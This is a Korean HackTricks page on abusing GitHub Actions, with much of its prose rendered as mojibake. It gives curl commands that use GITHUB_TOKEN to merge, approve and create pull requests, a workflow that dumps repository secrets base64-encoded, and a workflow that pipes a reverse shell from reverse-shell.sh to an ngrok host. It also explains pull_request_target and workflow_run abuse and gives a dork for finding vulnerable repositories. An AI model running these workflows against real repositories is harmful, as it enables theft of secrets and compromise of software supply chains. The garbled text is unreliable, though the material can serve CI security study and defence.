# Github Actions ì•…ìš©

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜, **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

ì´ í˜ì´ì§€ì—ì„œ ì°¾ì„ ìˆ˜ ìˆëŠ” ë‚´ìš©:

* ê³µê²©ìê°€ Github Actionì— ì ‘ê·¼í–ˆì„ ë•Œì˜ **ëª¨ë“  ì˜í–¥ ìš”ì•½**
* **ì•¡ì…˜ì— ì ‘ê·¼í•˜ëŠ”** ë‹¤ì–‘í•œ ë°©ë²•:
* ì•¡ì…˜ì„ ìƒì„±í•  **ê¶Œí•œ**ì´ ìˆëŠ” ê²½ìš°
* **pull request** ê´€ë ¨ íŠ¸ë¦¬ê±° ì•…ìš©
* **ë‹¤ë¥¸ ì™¸ë¶€ ì ‘ê·¼** ê¸°ìˆ  ì•…ìš©
* ì´ë¯¸ ì†ìƒëœ ì €ì¥ì†Œì—ì„œ **í”¼ë²—íŒ…**
* ë§ˆì§€ë§‰ìœ¼ë¡œ, **ë‚´ë¶€ì—ì„œ ì•¡ì…˜ì„ ì•…ìš©í•˜ëŠ” í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡ ê¸°ìˆ **ì— ëŒ€í•œ ì„¹ì…˜

## ì˜í–¥ ìš”ì•½

[**Github Actions ê¸°ë³¸ ì •ë³´**](../basic-github-information.md#github-actions)ì— ëŒ€í•œ ì†Œê°œë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

**ì €ì¥ì†Œ**ì—ì„œ **ì„ì˜ì˜ Github actionsë¥¼ ì‹¤í–‰/ì½”ë“œ ì£¼ì…**í•  ìˆ˜ ìˆëŠ” ê²½ìš°, ë‹¤ìŒì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* í•´ë‹¹ ì €ì¥ì†Œ/ì¡°ì§ì˜ **ë¹„ë°€**ì„ **íƒˆì·¨**.
* ì£¼ì…ë§Œ ê°€ëŠ¥í•˜ë‹¤ë©´, ì›Œí¬í”Œë¡œìš°ì— ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ê²ƒì„ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* **ì €ì¥ì†Œ ê¶Œí•œ**ì„ ì•…ìš©í•˜ì—¬ AWS ë° GCPì™€ ê°™ì€ ë‹¤ë¥¸ í”Œë«í¼ì— ì ‘ê·¼.
* **ì»¤ìŠ¤í…€ ì›Œì»¤ì—ì„œ ì½”ë“œ ì‹¤í–‰** (ì»¤ìŠ¤í…€ ì›Œì»¤ê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°) ë° ê±°ê¸°ì„œ í”¼ë²— ì‹œë„.
* ì €ì¥ì†Œ **ì½”ë“œ ë®ì–´ì“°ê¸°**.
* ì´ëŠ” `GITHUB_TOKEN`ì˜ ê¶Œí•œì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤ (ìˆëŠ” ê²½ìš°).
* **ë°°í¬** ë° ê¸°íƒ€ **ì•„í‹°íŒ©íŠ¸** **ì†ìƒ**.
* ì½”ë“œê°€ ë¬´ì–¸ê°€ë¥¼ ë°°í¬í•˜ê±°ë‚˜ ì €ì¥í•˜ëŠ” ê²½ìš°, ì´ë¥¼ ìˆ˜ì •í•˜ì—¬ ì¶”ê°€ ì ‘ê·¼ ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## GITHUB\_TOKEN

ì´ "**ë¹„ë°€**" ( `${{ secrets.GITHUB_TOKEN }}` ë° `${{ github.token }}`ì—ì„œ ì œê³µë¨)ì€ ê´€ë¦¬ìê°€ ì´ ì˜µì…˜ì„ í™œì„±í™”í•  ë•Œ ì œê³µë©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

ì´ í† í°ì€ **Github Application**ì´ ì‚¬ìš©í•  ë™ì¼í•œ í† í°ì´ë¯€ë¡œ ë™ì¼í•œ ì—”ë“œí¬ì¸íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
GithubëŠ” **cross-repository** ì ‘ê·¼ì„ í—ˆìš©í•˜ëŠ” [**flow**](https://github.com/github/roadmap/issues/74)ë¥¼ ì¶œì‹œí•´ì•¼ í•©ë‹ˆë‹¤, ê·¸ë˜ì„œ ì €ì¥ì†Œê°€ `GITHUB_TOKEN`ì„ ì‚¬ìš©í•˜ì—¬ ë‹¤ë¥¸ ë‚´ë¶€ ì €ì¥ì†Œì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ í† í°ì˜ ê°€ëŠ¥í•œ **ê¶Œí•œ**ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

í† í°ì€ **ì‘ì—…ì´ ì™„ë£Œëœ í›„ ë§Œë£Œ**ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”.\
ì´ í† í°ì€ ë‹¤ìŒê³¼ ê°™ì´ ìƒê²¼ìŠµë‹ˆë‹¤: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

ì´ í† í°ìœ¼ë¡œ í•  ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ ì‘ì—…:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}

{% endtab %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
ì—¬ëŸ¬ ê²½ìš°ì— **Github Actions í™˜ê²½ ë˜ëŠ” secrets ë‚´ì—ì„œ github ì‚¬ìš©ì í† í°ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì´ëŸ¬í•œ í† í°ì€ ì €ì¥ì†Œ ë° ì¡°ì§ì— ëŒ€í•œ ë” ë§ì€ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

<details>

<summary>Github Action ì¶œë ¥ì—ì„œ secrets ë‚˜ì—´</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsë¡œ reverse shell ì–»ê¸°</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ Github Tokenì— ë¶€ì—¬ëœ ê¶Œí•œì„ **ë¡œê·¸ë¥¼ í™•ì¸**í•˜ì—¬ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## í—ˆìš©ëœ ì‹¤í–‰

{% hint style="info" %}
ì´ê²ƒì€ Github actionsì„ ì†ìƒì‹œí‚¤ëŠ” ê°€ì¥ ì‰¬ìš´ ë°©ë²•ì¼ ê²ƒì…ë‹ˆë‹¤. ì´ ê²½ìš°ëŠ” **ì¡°ì§ì—ì„œ ìƒˆë¡œìš´ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ì ‘ê·¼ ê¶Œí•œ**ì´ ìˆê±°ë‚˜, **ë¦¬í¬ì§€í† ë¦¬ì— ëŒ€í•œ ì“°ê¸° ê¶Œí•œ**ì´ ìˆëŠ” ê²½ìš°ë¥¼ ê°€ì •í•©ë‹ˆë‹¤.

ì´ ì‹œë‚˜ë¦¬ì˜¤ì— í•´ë‹¹í•˜ëŠ” ê²½ìš° [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action)ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ë¦¬í¬ì§€í† ë¦¬ ìƒì„±ì—ì„œì˜ ì‹¤í–‰

ì¡°ì§ì˜ êµ¬ì„±ì›ì´ **ìƒˆë¡œìš´ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆê³  Github actionsì„ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **ìƒˆë¡œìš´ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ìƒì„±í•˜ê³  ì¡°ì§ ìˆ˜ì¤€ì—ì„œ ì„¤ì •ëœ ë¹„ë°€ì„ íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ìƒˆë¡œìš´ ë¸Œëœì¹˜ì—ì„œì˜ ì‹¤í–‰

ì´ë¯¸ Github Actionì´ êµ¬ì„±ëœ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ **ìƒˆë¡œìš´ ë¸Œëœì¹˜ë¥¼ ìƒì„±**í•  ìˆ˜ ìˆëŠ” ê²½ìš°, ì´ë¥¼ **ìˆ˜ì •**í•˜ê³  **ì—…ë¡œë“œ**í•œ ë‹¤ìŒ **ìƒˆë¡œìš´ ë¸Œëœì¹˜ì—ì„œ í•´ë‹¹ ì•¡ì…˜ì„ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë°©ë²•ìœ¼ë¡œ **ë¦¬í¬ì§€í† ë¦¬ ë° ì¡°ì§ ìˆ˜ì¤€ì˜ ë¹„ë°€ì„ ìœ ì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (í•˜ì§€ë§Œ ê·¸ë“¤ì´ ì–´ë–»ê²Œ í˜¸ì¶œë˜ëŠ”ì§€ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤).

ìˆ˜ì •ëœ ì•¡ì…˜ì„ **ìˆ˜ë™ìœ¼ë¡œ,** **PRì´ ìƒì„±ë  ë•Œ** ë˜ëŠ” **ì½”ë“œê°€ í‘¸ì‹œë  ë•Œ** ì‹¤í–‰ ê°€ëŠ¥í•˜ê²Œ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì–¼ë§ˆë‚˜ ëˆˆì— ë„ê³  ì‹¶ì€ì§€ì— ë”°ë¼ ë‹¤ë¦…ë‹ˆë‹¤):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## í¬í¬ëœ ì‹¤í–‰

{% hint style="info" %}
ê³µê²©ìê°€ **ë‹¤ë¥¸ ì €ì¥ì†Œì˜ Github Actionì„ ì‹¤í–‰**í•  ìˆ˜ ìˆê²Œ í•˜ëŠ” ë‹¤ì–‘í•œ íŠ¸ë¦¬ê±°ê°€ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ íŠ¸ë¦¬ê±° ê°€ëŠ¥í•œ ì•¡ì…˜ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš°, ê³µê²©ìê°€ ì´ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### `pull_request`

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request`**ëŠ” ëª‡ ê°€ì§€ ì˜ˆì™¸ë¥¼ ì œì™¸í•˜ê³  í’€ ë¦¬í€˜ìŠ¤íŠ¸ê°€ ìˆ˜ì‹ ë  ë•Œë§ˆë‹¤ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤: ê¸°ë³¸ì ìœ¼ë¡œ **ì²˜ìŒìœ¼ë¡œ** **í˜‘ì—…**í•˜ëŠ” ê²½ìš°, **ìœ ì§€ ê´€ë¦¬ì**ê°€ ì›Œí¬í”Œë¡œìš°ì˜ **ì‹¤í–‰**ì„ **ìŠ¹ì¸**í•´ì•¼ í•©ë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
ê¸°ë³¸ ì œí•œì´ **ì²˜ìŒ ê¸°ì—¬ì**ì—ê²Œ ì ìš©ë˜ë¯€ë¡œ, **ìœ íš¨í•œ ë²„ê·¸/ì˜¤íƒ€ë¥¼ ìˆ˜ì •**í•˜ê³  **ìƒˆë¡œìš´ `pull_request` ê¶Œí•œì„ ë‚¨ìš©**í•˜ëŠ” **ë‹¤ë¥¸ PRì„ ë³´ë‚¼** ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì´ê²ƒì„ í…ŒìŠ¤íŠ¸í–ˆì§€ë§Œ ì‘ë™í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤**: ~~ë˜ ë‹¤ë¥¸ ì˜µì…˜ì€ í”„ë¡œì íŠ¸ì— ê¸°ì—¬í•˜ê³  ê³„ì •ì„ ì‚­ì œí•œ ì‚¬ëŒì˜ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤.~~
{% endhint %}

ê²Œë‹¤ê°€, ê¸°ë³¸ì ìœ¼ë¡œ ëŒ€ìƒ ì €ì¥ì†Œì— ëŒ€í•œ **ì“°ê¸° ê¶Œí•œ**ê³¼ **ë¹„ë°€ ì ‘ê·¼**ì„ ë°©ì§€í•©ë‹ˆë‹¤. ì´ëŠ” [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)ì— ì–¸ê¸‰ëœ ëŒ€ë¡œì…ë‹ˆë‹¤:

> `GITHUB_TOKEN`ì„ ì œì™¸í•˜ê³ , **ë¹„ë°€ì€ í¬í¬ëœ ì €ì¥ì†Œì—ì„œ íŠ¸ë¦¬ê±°ëœ ì›Œí¬í”Œë¡œìš°ì— ì „ë‹¬ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. **í¬í¬ëœ ì €ì¥ì†Œì—ì„œì˜ í’€ ë¦¬í€˜ìŠ¤íŠ¸**ì—ì„œëŠ” **`GITHUB_TOKEN`ì´ ì½ê¸° ì „ìš© ê¶Œí•œ**ì„ ê°€ì§‘ë‹ˆë‹¤.

ê³µê²©ìëŠ” Github Actionì˜ ì •ì˜ë¥¼ ìˆ˜ì •í•˜ì—¬ ì„ì˜ì˜ ì‘ì—…ì„ ì‹¤í–‰í•˜ê³  ì„ì˜ì˜ ì•¡ì…˜ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì•ì„œ ì–¸ê¸‰í•œ ì œí•œ ë•Œë¬¸ì— ë¹„ë°€ì„ í›”ì¹˜ê±°ë‚˜ ì €ì¥ì†Œë¥¼ ë®ì–´ì“¸ ìˆ˜ëŠ” ì—†ìŠµë‹ˆë‹¤.

{% hint style="danger" %}
**ì˜ˆ, ê³µê²©ìê°€ PRì—ì„œ íŠ¸ë¦¬ê±°ë  Github Actionì„ ë³€ê²½í•˜ë©´, ê·¸ì˜ Github Actionì´ ì‚¬ìš©ë˜ê³  ì›ë³¸ ì €ì¥ì†Œì˜ ê²ƒì´ ì‚¬ìš©ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤!**
{% endhint %}

ê³µê²©ìê°€ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ ì œì–´í•˜ê¸° ë•Œë¬¸ì—, ë¹„ë°€ì´ë‚˜ `GITHUB_TOKEN`ì˜ ì“°ê¸° ê¶Œí•œì´ ì—†ë”ë¼ë„ ê³µê²©ìëŠ” ì˜ˆë¥¼ ë“¤ì–´ **ì•…ì„± ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### **`pull_request_target`**

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request_target`**ì€ ëŒ€ìƒ ì €ì¥ì†Œì— ëŒ€í•œ **ì“°ê¸° ê¶Œí•œ**ê³¼ **ë¹„ë°€ ì ‘ê·¼**ì„ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤ (ê·¸ë¦¬ê³  ê¶Œí•œì„ ë¬»ì§€ ì•ŠìŠµë‹ˆë‹¤).

ì›Œí¬í”Œë¡œìš° íŠ¸ë¦¬ê±° **`pull_request_target`**ì€ **ê¸°ë³¸ ì»¨í…ìŠ¤íŠ¸**ì—ì„œ ì‹¤í–‰ë˜ë©° PRì—ì„œ ì œê³µëœ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤ (ì¦‰, **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•Šê¸° ìœ„í•´**). `pull_request_target`ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ë¬¸ì„œ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.\
ë˜í•œ, ì´ íŠ¹ì • ìœ„í—˜í•œ ì‚¬ìš©ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ì´ [**github ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)ì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤.

**ì‹¤í–‰ëœ ì›Œí¬í”Œë¡œìš°**ê°€ **PRì´ ì•„ë‹Œ ê¸°ë³¸**ì—ì„œ ì •ì˜ëœ ê²ƒì´ê¸° ë•Œë¬¸ì— **`pull_request_target`**ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ **ì•ˆì „**í•´ ë³´ì¼ ìˆ˜ ìˆì§€ë§Œ, **ëª‡ ê°€ì§€ ê²½ìš°ì—ëŠ” ê·¸ë ‡ì§€ ì•ŠìŠµë‹ˆë‹¤**.

ì´ ê²½ìš° **ë¹„ë°€ì— ì ‘ê·¼**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) íŠ¸ë¦¬ê±°ëŠ” ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ê°€ `completed`, `requested` ë˜ëŠ” `in_progress` ìƒíƒœì¼ ë•Œ ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤.

ì´ ì˜ˆì œì—ì„œëŠ” ë³„ë„ì˜ "Run Tests" ì›Œí¬í”Œë¡œìš°ê°€ ì™„ë£Œëœ í›„ ì›Œí¬í”Œë¡œìš°ê°€ ì‹¤í–‰ë˜ë„ë¡ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
ë˜í•œ, ë¬¸ì„œì— ë”°ë¥´ë©´: `workflow_run` ì´ë²¤íŠ¸ì— ì˜í•´ ì‹œì‘ëœ ì›Œí¬í”Œë¡œìš°ëŠ” **ì´ì „ ì›Œí¬í”Œë¡œìš°ê°€ ê·¸ë ‡ì§€ ì•Šë”ë¼ë„ ë¹„ë°€ê³¼ ì“°ê¸° í† í°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ì´ëŸ¬í•œ ì¢…ë¥˜ì˜ ì›Œí¬í”Œë¡œìš°ëŠ” ì™¸ë¶€ ì‚¬ìš©ìê°€ **`pull_request`** ë˜ëŠ” **`pull_request_target`**ì„ í†µí•´ **íŠ¸ë¦¬ê±°**í•  ìˆ˜ ìˆëŠ” **ì›Œí¬í”Œë¡œìš°**ì— **ì˜ì¡´**í•˜ëŠ” ê²½ìš° ê³µê²©ë°›ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ëª‡ ê°€ì§€ ì·¨ì•½í•œ ì˜ˆì‹œëŠ” [**ì´ ë¸”ë¡œê·¸**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)ì—ì„œ **ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**. ì²« ë²ˆì§¸ ì˜ˆì‹œëŠ” **`workflow_run`** íŠ¸ë¦¬ê±°ëœ ì›Œí¬í”Œë¡œìš°ê°€ ê³µê²©ìì˜ ì½”ë“œë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: `${{ github.event.pull_request.head.sha }}`\
ë‘ ë²ˆì§¸ ì˜ˆì‹œëŠ” **ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ”** ì½”ë“œì—ì„œ **ì•„í‹°íŒ©íŠ¸**ë¥¼ **`workflow_run`** ì›Œí¬í”Œë¡œìš°ë¡œ ì „ë‹¬í•˜ê³  ì´ ì•„í‹°íŒ©íŠ¸ì˜ ë‚´ìš©ì„ RCEì— **ì·¨ì•½í•œ ë°©ì‹ìœ¼ë¡œ ì‚¬ìš©í•˜ëŠ” ê²ƒ**ì…ë‹ˆë‹¤.

### `workflow_call`

TODO

TODO: pull\_requestì—ì„œ ì‹¤í–‰ë  ë•Œ ì‚¬ìš©/ë‹¤ìš´ë¡œë“œëœ ì½”ë“œê°€ ì›ë³¸ì¸ì§€ í¬í¬ëœ PRì¸ì§€ í™•ì¸

## í¬í¬ëœ ì‹¤í–‰ ì•…ìš©

ì™¸ë¶€ ê³µê²©ìê°€ github ì›Œí¬í”Œë¡œìš°ë¥¼ ì‹¤í–‰í•˜ë„ë¡ ë§Œë“¤ ìˆ˜ ìˆëŠ” ëª¨ë“  ë°©ë²•ì„ ì–¸ê¸‰í–ˆìœ¼ë‹ˆ, ì´ì œ ì´ëŸ¬í•œ ì‹¤í–‰ì´ ì˜ëª» êµ¬ì„±ëœ ê²½ìš° ì–´ë–»ê²Œ ì•…ìš©ë  ìˆ˜ ìˆëŠ”ì§€ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤:

### ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì²´í¬ì•„ì›ƒ ì‹¤í–‰

**`pull_request`**ì˜ ê²½ìš°, ì›Œí¬í”Œë¡œìš°ëŠ” **PRì˜ ì»¨í…ìŠ¤íŠ¸**ì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤ (ë”°ë¼ì„œ **ì•…ì„± PR ì½”ë“œ**ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤), í•˜ì§€ë§Œ ëˆ„êµ°ê°€ê°€ **ë¨¼ì € ìŠ¹ì¸í•´ì•¼** í•˜ê³  ëª‡ ê°€ì§€ [ì œí•œ](./#pull\_request)ê³¼ í•¨ê»˜ ì‹¤í–‰ë©ë‹ˆë‹¤.

**`pull_request_target` ë˜ëŠ” `workflow_run`**ì„ ì‚¬ìš©í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ì˜ ê²½ìš° **`pull_request_target` ë˜ëŠ” `pull_request`**ì—ì„œ íŠ¸ë¦¬ê±°ë  ìˆ˜ ìˆëŠ” ì›Œí¬í”Œë¡œìš°ì— ì˜ì¡´í•˜ëŠ” ê²½ìš° ì›ë³¸ ì €ì¥ì†Œì˜ ì½”ë“œê°€ ì‹¤í–‰ë˜ë¯€ë¡œ **ê³µê²©ìê°€ ì‹¤í–‰ë˜ëŠ” ì½”ë“œë¥¼ ì œì–´í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**.

{% hint style="danger" %}
ê·¸ëŸ¬ë‚˜, **ì•¡ì…˜**ì´ **ëª…ì‹œì ì¸ PR ì²´í¬ì•„ì›ƒ**ì„ ê°€ì§€ê³  ìˆì–´ **PRì˜ ì½”ë“œë¥¼ ê°€ì ¸ì˜¤ëŠ” ê²½ìš°** (ê¸°ë³¸ì´ ì•„ë‹Œ), ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‚¬ìš©í•˜ê²Œ ë©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ (PR ì½”ë“œê°€ ë‹¤ìš´ë¡œë“œë˜ëŠ” 12ë²ˆì§¸ ì¤„ì„ í™•ì¸í•˜ì‹­ì‹œì˜¤):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

**ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì½”ë“œê°€ `npm install` ë˜ëŠ” `npm build` ì¤‘ì— ì‹¤í–‰**ë  ìˆ˜ ìˆìœ¼ë©°, ë¹Œë“œ ìŠ¤í¬ë¦½íŠ¸ì™€ ì°¸ì¡°ëœ **íŒ¨í‚¤ì§€ëŠ” PR ì‘ì„±ìê°€ ì œì–´**í•©ë‹ˆë‹¤.

{% hint style="warning" %}
ì·¨ì•½í•œ ì•¡ì…˜ì„ ê²€ìƒ‰í•˜ê¸° ìœ„í•œ github dorkëŠ”: `event.pull_request pull_request_target extension:yml`ì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜, ì•¡ì…˜ì´ ì•ˆì „í•˜ì§€ ì•Šê²Œ êµ¬ì„±ë˜ì—ˆë”ë¼ë„ ì‘ì—…ì„ ì•ˆì „í•˜ê²Œ ì‹¤í–‰í•˜ë„ë¡ êµ¬ì„±í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤ (ì˜ˆ: PRì„ ìƒì„±í•˜ëŠ” ë°°ìš°ê°€ ëˆ„êµ¬ì¸ì§€ì— ëŒ€í•œ ì¡°ê±´ ì‚¬ìš©).
{% endhint %}

### ì»¨í…ìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸ ì¸ì ì…˜ <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

